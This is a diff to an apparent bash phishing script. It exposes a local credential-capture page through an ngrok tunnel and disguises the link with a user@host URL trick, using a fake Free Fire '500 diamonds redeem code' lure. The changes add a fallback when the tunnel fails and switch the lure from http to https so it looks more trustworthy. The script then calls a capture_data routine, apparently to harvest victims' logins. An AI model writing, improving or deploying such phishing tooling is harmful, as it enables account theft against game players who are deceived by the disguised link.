@@ -260,9 +260,26 @@ start_ngrok() {
 	}
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	capture_data
+
+	if [[ $ngrok_url == "" ]]; then
+		cat <<-EOF
+			${RED}[ERROR]${BLUE} Please Trun On your Mobile Hotspot and Try again
+
+			${RED}[${WHITE}01${RED}]${ORANGE} Restart 		${RED}[${WHITE}02${RED}]${ORANGE} Exit
+		EOF
+		read -p "${RED}[${WHITE}-${RED}]${GREEN} Press any Key to continue : ${BLUE}"
+
+		if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+			main_menu
+		else
+			msg_exit
+		fi
+		echo -e ""
+	else
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+		echo -e "${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+		capture_data
+	fi
 }
 
 main_menu() {
@@ -283,7 +300,7 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		mask='http://freefire-redeem-code-for-500-diamonds'
+		mask='https://freefire-redeem-code-for-500-diamonds'
 		start_ngrok
 	elif [[ "$REPLY" == 99 ]]; then
 		about
